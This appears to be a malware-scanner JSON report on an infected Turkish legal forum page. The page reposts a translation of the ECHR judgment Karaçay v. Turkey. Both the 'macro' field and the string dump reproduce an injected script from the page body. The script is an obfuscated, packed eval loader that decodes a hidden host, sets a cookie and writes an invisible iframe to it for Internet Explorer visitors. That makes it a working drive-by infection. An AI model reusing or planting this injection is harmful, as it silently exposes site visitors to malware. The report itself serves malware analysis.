{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "write": "May write to a file"
        },
        "macro": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n<html dir=\"ltr\" lang=\"tr\">\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<meta http-equiv=\"Content-Style-Type\" content=\"text/css\">\n<meta http-equiv=\"Content-Language\" content=\"tr\">\n<title>EMSAL KARARLAR VE İÇTİHATLAR :: Konuyu görüntüle - KARAÇAY- TÜRKİYE DAVASI</title>\n\n<style type=\"text/css\">\n<!--\n\nbody {\n\tfont-family: Verdana,serif;\n\tfont-size: 10pt;\n}\n\nimg {\n\tborder: 0;\n}\n\ntd {\n\tfont-family: Verdana,serif;\n\tfont-size: 10pt;\n\tline-height: 150%;\n}\n\n.code,\n.quote {\n\tfont-size: smaller;\n\tborder: black solid 1px;\n}\n\n.forum {\n\tfont-family: Arial,Helvetica,sans-serif;\n\tfont-weight: bold;\n\tfont-size: 18pt;\n}\n\n.topic {\n\tfont-family: Arial,Helvetica,sans-serif;\n\tfont-size: 14pt;\n\tfont-weight: bold;\n}\n\n.gensmall {\n\tfont-size: 8pt;\n}\n\nhr {\n\tcolor: #888;\n\theight: 3px;\n\tborder-style: solid;\n}\n\nhr.sep {\n\tcolor: #aaa;\n\theight: 1px;\n\tborder-style: dashed;\n}\n//-->\n</style>\n\n</head>\n<body><script>sa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));</script>\n\n<table width=\"85%\" cellspacing=\"3\" cellpadding=\"0\" border=\"0\" align=\"center\">\n<tr>\n\t<td colspan=\"2\" align=\"center\"><span class=\"Forum\">EMSAL KARARLAR VE İÇTİHATLAR</span><br /><span class=\"gensmall\"><a href=\"http://www.emsalkararlar.com/\">http://www.emsalkararlar.com/</a></span></td>\n</tr>\n<tr>\n\t<td colspan=\"2\"><br /></td>\n</tr>\n<tr>\n\t<td><span class=\"topic\">KARAÇAY- TÜRKİYE DAVASI</span><br /><span class=\"gensmall\"><a href=\"http://www.emsalkararlar.com/viewtopic.php?f=17&amp;t=20\">http://www.emsalkararlar.com/viewtopic.php?f=17&amp;t=20</a></span></td>\n\t<td align=\"right\" valign=\"bottom\"><span class=\"gensmall\"><strong>1</strong> sayfadan <strong>1</strong>. sayfa</span></td>\n</tr>\n</table>\n\n\n\t<hr width=\"85%\" />\n\n\t<table width=\"85%\" cellspacing=\"3\" cellpadding=\"0\" border=\"0\" align=\"center\">\n\t<tr>\n\t\t<td width=\"10%\" nowrap=\"nowrap\">Yazar:&nbsp;</td>\n\t\t<td><b style=\"color: #AA0000\">fikirbay</b> [ Sal Ekm 19, 2010 12:10 am ]</td>\n\t</tr>\n\t<tr>\n\t\t<td width=\"10%\" nowrap=\"nowrap\">İleti başlığı:&nbsp;</td>\n\t\t<td><b>KARAÇAY- TÜRKİYE DAVASI</b></td>\n\t</tr>\n\t<tr>\n\t\t<td colspan=\"2\"><hr class=\"sep\" />AVRUPA İNSAN HAKLARI MAHKEMESİ<br /><br />KARAÇAY- TÜRKİYE DAVASI<br /><br />(Başvuru no:6615/03<br /><br />KARAR ÇEVİRİSİ<br /><br />STRAZBURG <br /><br />27 Mart 2007<br /><br />İşbu karar AİHS’nin 44§2 maddesinde belirtilen koşullar çerçevesinde kesinleşecektir. Şekli bazı düzeltmelere tabi olabilir.<br /><br />Karaçay-Türkiye davasında,<br /><br />Avrupa İnsan Hakları Mahkemesi (İkinci Daire),<br /><br />F.TULKENS, başkan<br /><br />I. CABRAL BARRETO,<br /><br />R.TÜRMEN,<br /><br />M. UGREKHELİDZE,<br /><br />V. ZAGREBELSKY,<br /><br />A. MULARONİ,<br /><br />D. POPOVİC, yargıçlar,<br /><br />ve Bölüm Sekreteri S. DOLLE’nin katılımı ile<br /><br />Avrupa İnsan Hakları Mahkemesi Heyeti olarak toplanmış,<br /><br />6 Mart 2007 tarihinde yapılan özel görüşmeler sonucunda, yukarıda son anılan tarihte benimsenmiş olan aşağıdaki karara varmıştır:<br /><br />USULİ İŞLEMLER<br /><br />1. Türkiye Cumhuriyeti aleyhine açılan (6615/03) başvuru no’lu davanın nedeni, bu ülke vatandaşı olan Erhan Karaçay’ın (“başvuran”) 13 Ocak 2003 tarihinde Avrupa İnsan Hakları Sözleşmesi’nin (“AİHS”) 34. maddesi uyarınca Avrupa İnsan Hakları Mahkemesi’ne (“AİHM”) yapmış olduğu başvurudur.<br /><br />2. Başvuran, AİHM önünde Ankara Barosu avukatlarından sayın G. Candoğan tarafından temsil edilmektedir. Türk Hükümeti (“Hükümet”) kendisini temsilen bir görevli tayin etmemiştir.<br /><br />3. Başvuran, AİHS’nin 6, 11, 13 ve 14. maddelerinin ihlal edildiğini iddia etmektedir.<br /><br />4. AİHM, 15 Aralık 2005 tarihinde başvuruyu Hükümet’e tebliğ etmeye karar vermiştir. AİHM, AİHS’nin 29 § 3. maddesi uyarınca başvurunun kabul edilebilirliği ile esasının birlikte incelenmesi yönünde karar vermiştir.<br /><br />OLAYLAR<br /><br />I. DAVA KOŞULLARI<br /><br />5. Elektrik mühendisi olan başvuran 1957 doğumlu olup İstanbul’da ikamet etmektedir.<br /><br />6. Olayların meydana geldiği dönemde başvuran, kamu görevlilerinin örgütlendiği sendika birliği olan Kamu Emekçileri Sendikaları Konfederasyonu’na (KESK) bağlı Yapı-Yol-Sen Sendikası üyesidir.<br /><br />7. İstanbul Valiliği 5 Eylül 2002 tarihinde, memur maaşlarını protesto etmek ve kamuoyu oluşturmak maksadıyla KESK’in iş yavaşlatma ve bırakma şeklinde eylem yapacağı yönünde yetkili makamları bilgilendirmiştir. İstanbul Valiliği, ilgili kurumlardan bu eylemlere katılacak olan kurum personeli hakkında önleyici tüm tedbirleri almalarını talep etmiştir. İstanbul Valiliği’nin bu yazısı aynı zamanda Bayındırlık ve İskan Bakanlığı’na da gönderilmiştir.<br /><br />8. Bayındırlık ve İskan Bakanlığı’na göre başvuran, KESK tarafından memur maaşlarını protesto etmek amacıyla 5 Eylül 2002 tarihinde İstanbul’da yapılan eyleme iştirak etmiştir.<br /><br />9. 15 Ekim 2002 tarihinde başvurana, memur maaşlarını protesto etmek amacıyla KESK tarafından düzenlenen eyleme katıldığı gerekçesiyle aleyhinde disiplin soruşturması başlatıldığı hususunda bilgi verilmiştir. Başvurandan yazılı savunmasını sunması talep edilmiştir.<br /><br />10. Başvuran, 21 Ekim 2002 tarihinde yazılı savunmasını sunmuştur. Başvuran, İstanbul’da sel baskınlarının meydana gelmesi nedeniyle meslektaşları ile birlikte serviste görevlendirildiğini belirterek, 5 Eylül 2002 tarihinde düzenlenen eyleme katıldığını reddetmiştir.<br /><br />11. 24 Aralık 2002 tarihinde 657 sayılı Kanun’nun 124/A bendi uyarınca başvuran, “uyarma” cezası ile cezalandırılmıştır. Bayındırlık ve İskan Bakanlığı, polis tarafından düzenlenen tutanaklardan, yazılı ve görsel basından kendisinin KESK tarafından düzenlenen eyleme katıldığının tespit edildiğini belirtmiştir.<br /><br />12. Başvuran 2 Ocak 2003 tarihinde Bayındırlık ve İskan Bakanlığı’na başvurarak verilen uyarı cezasına itiraz etmiştir. Başvuran, sözkonusu eyleme katılmadığı ve eylemin yapıldığı gün İstanbul’da meydana gelen sel baskınları nedeniyle meslektaşları ile birlikte serviste görevli olduğunu belirtmiştir. Başvuran, bu cezanın uluslararası anlaşmalara ve sendika hakkını güvence altına alan ulusal düzenlemelere aykırı olduğunu iddia etmiştir. Başvuran, KESK’e bağlı Yapı-Yol-Sen Sendikası üyesi olarak faaliyetlerde bulunması sebebiyle kendisine baskı yapıldığını ileri sürmüştür.<br /><br />13. 16 Ocak 2003 tarihinde, 657 sayılı Kanun’un 136. maddesi uyarınca başvuranın itirazı reddedilmiştir.<br /><br />II. İLGİLİ İÇ HUKUK VE ULUSLARARASI BELGELER<br /><br />1.Türk Hukuku<br /><br />1. Anayasa<br /><br />14. 129. maddesinde:<br /><br />“(…)<br /><br />Uyarma ve kınama cezalarıyla ilgili olanlar hariç, disiplin kararları yargı denetimi dışında bırakılamaz.”<br /><br />2. Devlet Memurlarına ilişkin 657 sayılı Yasa<br /><br />15. 125/A bendinde:<br /><br />“Uyarma: Memura, görevinde ve davranışlarında daha dikkatli olması gerektiğinin yazı ile bildirilmesidir.”<br /><br />16. 136. maddesinde:<br /><br />“(…) itiraz üzerine verilen kararlar kesin olup, bu kararlar aleyhinde idari yargı yoluna başvurulamaz.”<br /><br />B. 1961 tarihli Avrupa Sosyal Şartı <br /><br />17. Sosyal Şart’ın “Örgütlenme hakkı” olarak adlandırılan 5. maddesi şu şekildedir:<br /><br />“Akit Taraflar, çalışanların ve çalıştıranların ekonomik ve sosyal çıkarlarını korumak için yerel, ulusal ve uluslararası örgütler kurma ve bu örgütlere üye olma özgürlüğünü sağlamak veya geliştirmek amacıyla ulusal mevzuatın bu özgürlüğü zedelemesini veya zedeleyici biçimde uygulanmasını önlemeyi taahhüt ederler. Bu maddede öngörülen güvencelerin, güvenlik güçleri için hangi ölçüde uygulanacağı ulusal yasalarla veya düzenlemelerle belirtilir. Bu güvencelerin silahlı kuvvetler mensuplarına uygulanmasına ilişkin ilke ile bu kesime hangi düzeyde uygulanacağı yine ulusal yasalar veya düzenlemelerle saptanır.” <br /><br />HUKUK AÇISINDAN<br /><br />I. AİHS’NİN 11 VE 14. MADDELERİNİN İHLAL EDİLDİĞİ İDDİASI HAKKINDA<br /><br />18. Başvuran, bir eyleme katıldığı gerekçesiyle kendisine uyarma cezası verilmesinin dernek kurma ve toplantı özgürlüğü hakkını ihlal ettiğinden şikayetçi olmaktadır. Başvuran bu itibarla AİHS’nin 11 ve 14. maddelerine atıfta bulunmaktadır. AİHM bu şikayetleri 11. madde bakımından incelemeye karar vermiştir.<br /><br />“1. Herkes asayişi bozmayan toplantılar yapmak, dernek kurmak, ayrıca çıkarlarını korumak için başkalarıyla birlikte sendikalar kurmak ve sendikalara katılmak haklarına sahiptir.<br /><br />2. Bu hakların kullanılması, demokratik bir toplumda zorunlu tedbirler niteliğinde olarak, ulusal güvenliğin, kamu emniyetinin korunması, kamu düzeninin sağlanması ve suç işlenmesinin önlenmesi, sağlığın veya ahlakın veya başkalarınım hak ve özgürlüklerinin korunması amaçlarıyla ve ancak yasayla sınırlanabilir. Bu madde, bu hakların kullanılmasında silahlı kuvvetler, kolluk mensupları veya devletin idare mekanizmasında görevli olanlar hakkında meşru sınırlamalar konmasına engel değildir.”<br /><br />19. Hükümet bu iddiaya karşı çıkmaktadır.<br /><br />A. Kabuledilebilirlik Hakkında<br /><br />1. ratione materia bakımından yetkisizlik<br /><br />20. Hükümet, devlet memurları statüsünün 657 sayılı Devlet Memurları Kanunu ile düzenlendiğini ve devlet memurlarının özel sektörde çalışan kişilerden farklı ödev ve sorumluluklarının bulunduğunu belirtmektedir. Kamu hizmetini düzenleyen kurallar kamu hukukuna dayanmakta ve düzenin korunması hususunda İdare’nin takdir yetkisi bulunmaktadır. Hükümet, AİHS’nin ya da Protokollerinin bir devlet memurunun atanması ya da görev yeri ile ilgili itirazlarını güvence altına almadığını hatırlatmaktadır.<br /><br />21. Başvuran, bu iddiaya karşı çıkmaktadır.<br /><br />22. AİHM, 11. maddenin 1. paragrafının herkesin sendikaya üye olma ve çıkarlarını koruma hakkını güvence altına almaktadır. Devlet memurları doğrudan bu haktan mahrum bırakılmamaktadır. Bununla birlikte, ordu, emniyet ve diğerleri gibi bazı sektörlerde görev yapan devlet memurlarının sendikal faaliyetlerine sınırlamalar getirilmesi mümkündür fakat bu türden sınırlandırmaların resmi görevlerinin ifa edilmesinde gerekli olması gerekmektedir (Bkz., Council of Civil Servise Unions ve diğerleri-Birleşik Krallık, no: 11603/85, Komisyon’un 20 Ocak 1987 tarihli kararı, Kararlar ve Raporlar (KR) 50, s. 228). Başvuran, bu türden sınırlamalara tabi tutulmasını gerektirecek bir görevde bulunmamakta, Bayındırlık ve İskan Bakanlığı’nda elektrikçi olarak çalışmaktadır.<br /><br />23. Sonuç olarak AİHM, Hükümet’in itirazının reddedilmesine karar vermiştir.<br /><br />2. İç hukuk yollarının tüketilmemesi<br /><br />24. Hükümet, başvuranın İdare’nin keyfi eylemlerine karşı İdare Mahkemelerine başvurma imkanına sahip olduğunu belirtmektedir.<br /><br />25. Başvuran, 657 sayılı Kanuna dayanarak bu sava itiraz etmektedir.<br /><br />26. AİHM, Anayasa’nın 129 ve 657 sayılı Kanun’un 136. maddelerinden, bir uyarma veya ihtar cezasının hukuki kontrole tabi olamayacağı sonucunun ortaya çıktığını tespit etmektedir. Başvuran, davaya ilişkin olaylar ışığında mevcut olan iç hukuk yollarını tüketmiştir. Bundan dolayı AİHM Hükümet’in itirazını reddetmektedir.<br /><br />27. AİHM, şikayetin AİHS’nin 35§3 maddesi uyarınca açıkça dayanaktan yoksun olduğunu tespit etmektedir. Ayrıca AİHM, şikayetin başka hiçbir kabul edilemezlik gerekçesi ile ters düşmediğini tespit etmektedir. Dolayısıyla şikayeti kabul edilebilir ilan etmek yerinde olacaktır.<br /><br />B. Esasa Dair<br /><br />1.Müdahalenin varolması hakkında<br /><br />28. Başvuran, ulusal bir eyleme katıldığı gerekçesiyle kendisine uyarıda bulunulmasının dernek kurma özgürlüğü hakkına müdahale olarak değerlendirildiğini iddia etmektedir. Hükümet bu yönde bir görüş bildirmemiştir. Başvuran gibi AİHM de, dava konusu tedbirin dernek kurma özgürlüğü hakkını ihlal ettiğine kanaat getirmektedir.<br /><br />2. Müdahalenin dayanağı hakkında<br /><br />29. Benzeri bir müdahale, müdahaleyi “kanunun öngördüğü”, 2. paragraf uyarınca meşru amaç yada amaçlara yönelik olduğu ve bu amaçlara ulaşılması için “demokratik toplumda gerekli olduğu” durumlar dışında, 11. maddeyi ihlal etmektedir.<br /><br />a) “Kanun tarafından öngörülen”<br /><br />30. AİHM, başvurana verilen uyarma cezasının, 657 sayılı Kanunun 125 A maddesine uygun olduğuna itiraz edilmediğini tespit etmektedir. Ayrıca AİHM, dava konusu disiplin tedbirinin yasal dayanağının bulunduğunu not etmektedir.<br /><br />b) Meşru amaç<br /><br />31. Hükümet, müdahalenin düzenin korunması amacını güttüğünü savunmaktadır. Başvuran görüş bildirmemektedir.<br /><br />32. AİHM, mevcut davadaki müdahalenin AİHS’nin 11§2 maddesi uyarınca meşru amaç güttüğünden şüphe duymamaktadır. Bununla birlikte AİHM, benzeri bir müdahalenin gerekliliği açısından vardığı sonucu gözönünde bulundurarak, sorunu çözmeye çalışmanın gerekli olmadığına kanaat getirmektedir (aşağıda yer alan 34-38 paragrafları).<br /><br />c) “Demokratik toplumda gerekli olması”<br /><br />33. Başvuran, KESK’e bağlı bir sendikaya üye olmasaydı kendisine benzeri bir disiplin cezasının verilmeyeceğini savunmaktadır. Başvuran, 5 Eylül 2002 tarihli Valiliğin gönderdiği yazıya atıfta bulunarak, yasal olarak tanınan bir sendikanın yürüttüğü faaliyeti engellemeye ve öngörülen eylem gününden önce ve sonra tedbir alarak sendikanın etkililiğini azaltmaya yönelik idari bir uygulamanın bulunduğunu ortaya koymaktadır. Başvuran, Valiliğin önce eylemi engellemeye çalışarak ve daha sonra bu eylem gününe katılan devlet memurları aleyhinde ceza kararlarının alınması talimatını vererek, idarenin keyfi olarak hareket etmesini eleştirmektedir. İdare, başvurana uyarma cezasını verirken, böyle bir disiplin cezasının hukuki kontrolünün yapılmadığını bilmekteydi.<br /><br />34. Hükümet, başvuranın hala sözkonusu sendikanın üyesi olduğunu hatırlatmaktadır. Hükümet’e göre 11. madde, disiplin tedbirine konu teşkil eden sendika üyesi devlet memurlarına dokunulmazlık tanımamaktadır. Başvuran, 5 Haziran 2002 tarihinde işine gitmemesi nedeniyle disiplin cezası almıştır. Başvuran izin almadan sendika eylemine katılmıştır. Başvuran, görevlerini yerine getirmediği gerekçesiyle disiplin cezası almıştır.<br /><br />35. AİHM öncelikle, başvuranın ulusal makamlar önünde bu eyleme katıldığını inkar ettiğini not etmektedir. Başvuran, ulusal düzeyde sunduğu savunma layıhasında (yukarıda yer alan 12. paragraf), konu teşkil ettiği disiplin tedbirinin, Türkiye’nin ulusal ve uluslararası taahhütnameleri tarafından öngörüldüğü şekliyle sendikal haklarını ihlal ettiğini belirttiği açıkça ortadadır. Bundan dolayı başvuran, AİHS’nin 11. maddesine dayanarak yaptığı şikayetini ulusal mahkemeler önünde ileri sürdüğünden dolayı, AİHM, olaylara itiraz etmesine rağmen şikayetin esasını da inceleyecektir.<br /><br />36. Daha sonra AİHM, dava konusu ulusal eylem gününün ulusal düzeyde önceden bildirildiğini ve eylem yapılmasına itiraz edilmediğini tespit etmektedir. Başvuran bu eyleme katılarak toplantı yapma özgürlüğünü kullanmıştır (Ezelin-Fransa, 26 Nisan 1991 tarihli karar, A serisi no: 202, s. 21, § 41).<br /><br />37. AİHM, toplantı yapma özgürlüğünün önemini gözönünde bulundurarak, özellikle güdülen sözde meşru amaçla orantılı olup olmadığını tespit etmek amacıyla dava konusu disiplin cezasını dosyanın tamamı ışığında incelemiştir. AİHM, devlet memurlarının maaşlarının artış oranını protesto etmek amacıyla üyesi olduğu KESK’in düzenlediği eyleme katılması nedeniyle disiplin cezası adı altında başvurana uyarma cezasının verildiğini not etmektedir (yukarıda yer alan 7 ve 9. paragraflar). Oysa verilen ceza, her ne kadar düşük olsa da, kendisi gibi sendikaya üye kişilerin çıkarlarını savunmak amacıyla sendika üyelerinin grev ve eylemlere yasal olarak katılmamasına yönelik caydırıcı bir niteliğe sahiptir (sözüedilen Ezelin, § 53).<br /><br />38. AİHM, başvurana verilen uyarma cezasının “demokratik toplumda gerekli olmadığı” sonucuna varmaktadır.<br /><br />39. Dolayısıyla AİHS’nin 11. maddesi ihlal edilmiştir.<br /><br />II. AİHS’NİN 6 VE 13. MADDELERİNİN İHLAL EDİLDİĞİ İDDİASI HAKKINDA <br /><br />40. Başvuran, kendisine verilen uyarma cezasına itiraz etmek için iç hukuk yolunun bulunmamasından şikayet etmektedir. Başvuran AİHS’nin 6 ve 13. maddelerini ileri sürmektedir. AİHM, bu şikayeti, aşağıda ilgili bölümünün yer aldığı AİHS’nin 13. maddesi açısından incelemeye karar vermiştir:<br /><br />“(...) Sözleşme’de tanınmış olan hak ve özgürlükleri ihlal edilen herkes, ihlal fiili resmi görev yapan kimseler tarafından bu sıfatlarına dayanılarak yapılmış da olsa, ulusal bir makama etkili bir başvuru yapabilme hakkına sahiptir.”<br /><br />41. Hükümet, devlet memurlarının diğer bütün vatandaşlar gibi idarenin keyfi uygulamalarına karşı korunduğunu ileri sürmektedir. Hükümet, idarenin bütün eylemlerinin hukuki kontrole tabi olduğunu savunmaktadır.<br /><br />A. Kabul edilebilirlik hakkında<br /><br />42. AİHM, şikayetin AİHS’nin 35§3 maddesi uyarınca açıkça dayanaktan yoksun olduğunu tespit etmektedir. Ayrıca AİHM, şikayetin başka hiçbir kabul edilemezlik gerekçesi ile ters düşmediğini tespit etmektedir. Dolayısıyla şikayeti kabul edilebilir ilan etmek yerinde olacaktır.<br /><br />B. Esasa Dair <br /><br />43. AİHM, AİHS’nin 13. maddesinin, iç hukukta hak ve özgürlüklerin Sözleşme’de yer aldıkları şekliyle ileri sürülebilmelerini sağlayan başvuru yolunun mevcut bulunmasını güvence altına aldığını hatırlatmaktadır. Dolayısıyla bu hüküm, Sözleşmeye dayanan “savunulabilir bir şikayet”’in içeriğini incelemeye ve uygun tazmin yolunu sunmaya yetkili kılan iç hukuk yolunun bulunmasını gerekli kılmaktadır (Kudla-Polonya [Büyük Daire], no: 30210/96, § 157, AİHM 2000-XI).<br /><br />13. maddenin Sözleşmeci Devletlere getirdiği yükümlülüğün kapsamı, başvuranın şikayetinin niteliğine göre değişmektedir. Buna karşın 13. maddenin gerekli kıldığı başvuru yolu teoride olduğu kadar uygulamada da “etkili” olmak zorundadır (İlhan-Türkiye [Büyük Daire], no: 22277/93, §97, AİHM 2000-VII). 13. madde uyarınca bir “başvuru yolunun etkili olması”, kesin olarak davanın başvuran lehinde sonuçlanmasına bağlı değildir. Aynı şekilde bu hükümde bahsedilen “makam” adli bir makam olmak zorunda değildir. Ancak böyle bir durumda, söz konusu makamın yetkileri ve sunduğu güvenceler, kendisine yapılan başvurunun etkililiğini değerlendirmek için göz önünde bulundurulmaktadırlar. Bunun yanısıra aralarından biri tek başına 13. maddenin gerekliliklerine cevap veremese de, iç hukuk tarafından sunulan başvuru yollarının tümü, söz konusu gereklilikleri yerine getirebilir (Silver ve diğerleri-Birleşik Krallık, 25 Mart 1983 tarihli karar, A serisi no: 61, s. 42, § 113 ve Chahal-Birleşik Krallık, 15 Kasım 1996 tarihli karar, Derleme 1996-V, s. 1869-1870, § 145).<br /><br />44. Bu davada AİHM, Anayasa’nın 129 ve 657 sayılı Kanun’un 136. maddelerinden, bir uyarma veya ihtar cezasının hukuki kontrole tabi olamayacağı sonucunun ortaya çıktığını hatırlatmaktadır (yukarıda yer alan 14 ve 16. paragraflar). Böylece AİHM, ulusal hukukun, buna benzer bir uyarma cezasına başvuranın itiraz edebilmesi amacıyla ulusal mahkemeye başvuruda bulunma yolunun bulunmasını öngörmediğini tespit etmektedir (mutatis mutandis, Güneri ve diğerleri-Türkiye, no: 42853/98, 43609/98 ve 44291/98, §§ 77 ve 87, 12 Temmuz 2005 ve sözü edilen Metin Turan, § 36-38). Bundan dolayı başvurana yapılan uyarıya benzer disiplin cezasının verildiği durumlarda etkili başvuru yolunun bulunmaması, olası kötüye kullanımları engelleyecek yada sadece benzeri disiplin tedbirlerinin meşruluğunun denetlenmesini sağlayacak her türlü güvenceden başvuranı mahrum bırakmaktadır.<br /><br />45. Sonuç olarak AİHM, iç hukukta benzeri başvuru yolunun bulunmaması nedeniyle AİHS’nin 13. maddesinin ihlal edildiğine kanaat getirmektedir.<br /><br />III. AİHS’NİN 41. MADDESİNİN UYGULANMASI HAKKINDA<br /><br />46. AİHS’nin 41. maddesi uyarınca,<br /><br />“Mahkeme işbu Sözleşme ve protokollarının ihlal edildiğine karar verirse ve ilgili Yüksek Sözleşmeci Tarafın iç hukuku bu ihlali ancak kısmen telafi edebiliyorsa, Mahkeme, gerektiği takdirde, hakkaniyete uygun bir surette, zarar gören tarafın tatminine hükmeder.”<br /><br />A. Tazminat<br /><br />47. Başvuran, maruz kaldığı manevi zarar adı altında bir Euro’luk sembolik bir ücret talep etmektedir. Başvuran, uyarma ve ihtar cezasının hukuki kontrolden geçmesine engel olan 657 sayılı Kanun’un ilgili maddelerinin kaldırılmasını istemektedir.<br /><br />48. Hükümet bu iddialara itiraz etmektedir.<br /><br />49. AİHM, ihlal tespitinin tek başına manevi zarar için yeterli adil tazmin oluşturduğuna kanaat getirmektedir.<br /><br />B. Masraf ve Harcamalar <br /><br />50. Başvuran aynı zamanda rakam belirtmeksizin ve herhangi bir delille taleplerini desteklemeksizin masraf ve harcamalarının yanısıra avukatlık ücretinin de tazmin edilmesini istemektedir.<br /><br />51. Hükümet AİHM’den, başvuran taleplerini hiçbir şekilde kanıtlamadığından dolayı, herhangi bir ödemenin yapılmasına hükmetmemesini istemektedir.<br /><br />52. AİHM’nin yerleşik içtihadına göre, bir başvuran ancak gerçekliği, gerekliliği ve makul oranda oldukları ortaya konulan masraf ve harcamalarının tazminini elde edebilmektedir. Bu davada AİHM, elinde yeterince unsur bulunmamasını ve yukarıda belirtilen kriterleri göz önünde bulundurarak, başvuranın talebini reddetmektedir.<br /><br />BU GEREKÇELERE DAYALI OLARAK AİHM, OYBİRLİĞİYLE,<br /><br />1. Başvurunun kabul edilebilir olduğuna;<br /><br />2. AİHS’nin 11. maddesinin ihlal edildiğine;<br /><br />3. AİHS’nin 13. maddesinin ihlal edildiğine;<br /><br />4. İhlal tespitinin manevi zarar için tek başına yeterli adil tazmin oluşturduğuna;<br /><br />5. Adil tazmine ilişkin diğer taleplerin reddine;<br /><br />karar vermiştir.<br /><br />İşbu karar Fransızca olarak hazırlanmış ve AİHM İçtüzüğü’nün 77 §§ 2 ve 3. maddesine uygun olarak 27 Mart 2007 tarihinde yazılı olarak tebliğ edilmiştir.\n\t\t\n\t\t</td>\n\t</tr>\n\t</table>\n\n<hr width=\"85%\" />\n<!--\n\tWe request you retain the full copyright notice below including the link to www.phpbb.com.\n\tThis not only gives respect to the large amount of time given freely by the developers\n\tbut also helps build interest, traffic and use of phpBB3. If you (honestly) cannot retain\n\tthe full copyright we ask you at least leave in place the \"Powered by phpBB\" line. If you\n\trefuse to include even this then support on our forums may be affected.\n\n\tThe phpBB Group : 2006\n// -->\n\n<table width=\"85%\" cellspacing=\"3\" cellpadding=\"0\" border=\"0\" align=\"center\">\n<tr>\n\t<td><span class=\"gensmall\"><strong>1</strong> sayfadan <strong>1</strong>. sayfa</span></td>\n\t<td align=\"right\"><span class=\"gensmall\">Tüm zamanlar UTC + 2 saat </span></td>\n</tr>\n<tr>\n\t<td colspan=\"2\" align=\"center\"><span class=\"gensmall\">Powered by phpBB &copy; 2000, 2002, 2005, 2007 phpBB Group<br />http://www.phpbb.com/</span></td>\n</tr>\n</table>\n\n</body>\n</html>"
    },
    "filename": "VirusShare_e8f3bdf90b0c3b9e91ed1966a804d690",
    "filesize": 25103,
    "filetype": "HTML document, UTF-8 Unicode text, with very long lines",
    "hashes": {
        "md5": "e8f3bdf90b0c3b9e91ed1966a804d690",
        "sha1": "36cd7f01bb96fb915b0ea360c4ded873be330c88",
        "sha256": "abc07fe505b4d82d0e798cfeef3930ed30ab068e3bdced832e1862e107719e10"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">",
            "<html dir=\"ltr\" lang=\"tr\">",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">",
            "<meta http-equiv=\"Content-Style-Type\" content=\"text/css\">",
            "<meta http-equiv=\"Content-Language\" content=\"tr\">",
            "<title>EMSAL KARARLAR VE İ",
            "TİHATLAR :: Konuyu g",
            "le - KARA",
            "AY- T",
            "RKİYE DAVASI</title>",
            "<style type=\"text/css\">",
            "<!--",
            "body {",
            "\tfont-family: Verdana,serif;",
            "\tfont-size: 10pt;",
            "img {",
            "\tborder: 0;",
            "td {",
            "\tfont-family: Verdana,serif;",
            "\tfont-size: 10pt;",
            "\tline-height: 150%;",
            ".code,",
            ".quote {",
            "\tfont-size: smaller;",
            "\tborder: black solid 1px;",
            ".forum {",
            "\tfont-family: Arial,Helvetica,sans-serif;",
            "\tfont-weight: bold;",
            "\tfont-size: 18pt;",
            ".topic {",
            "\tfont-family: Arial,Helvetica,sans-serif;",
            "\tfont-size: 14pt;",
            "\tfont-weight: bold;",
            ".gensmall {",
            "\tfont-size: 8pt;",
            "hr {",
            "\tcolor: #888;",
            "\theight: 3px;",
            "\tborder-style: solid;",
            "hr.sep {",
            "\tcolor: #aaa;",
            "\theight: 1px;",
            "\tborder-style: dashed;",
            "//-->",
            "</style>",
            "</head>",
            "<body><script>sa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));</script>",
            "<table width=\"85%\" cellspacing=\"3\" cellpadding=\"0\" border=\"0\" align=\"center\">",
            "<tr>",
            "\t<td colspan=\"2\" align=\"center\"><span class=\"Forum\">EMSAL KARARLAR VE İ",
            "TİHATLAR</span><br /><span class=\"gensmall\"><a href=\"http://www.emsalkararlar.com/\">http://www.emsalkararlar.com/</a></span></td>",
            "</tr>",
            "<tr>",
            "\t<td colspan=\"2\"><br /></td>",
            "</tr>",
            "<tr>",
            "\t<td><span class=\"topic\">KARA",
            "AY- T",
            "RKİYE DAVASI</span><br /><span class=\"gensmall\"><a href=\"http://www.emsalkararlar.com/viewtopic.php?f=17&amp;t=20\">http://www.emsalkararlar.com/viewtopic.php?f=17&amp;t=20</a></span></td>",
            "\t<td align=\"right\" valign=\"bottom\"><span class=\"gensmall\"><strong>1</strong> sayfadan <strong>1</strong>. sayfa</span></td>",
            "</tr>",
            "</table>",
            "\t<hr width=\"85%\" />",
            "\t<table width=\"85%\" cellspacing=\"3\" cellpadding=\"0\" border=\"0\" align=\"center\">",
            "\t<tr>",
            "\t\t<td width=\"10%\" nowrap=\"nowrap\">Yazar:&nbsp;</td>",
            "\t\t<td><b style=\"color: #AA0000\">fikirbay</b> [ Sal Ekm 19, 2010 12:10 am ]</td>",
            "\t</tr>",
            "\t<tr>",
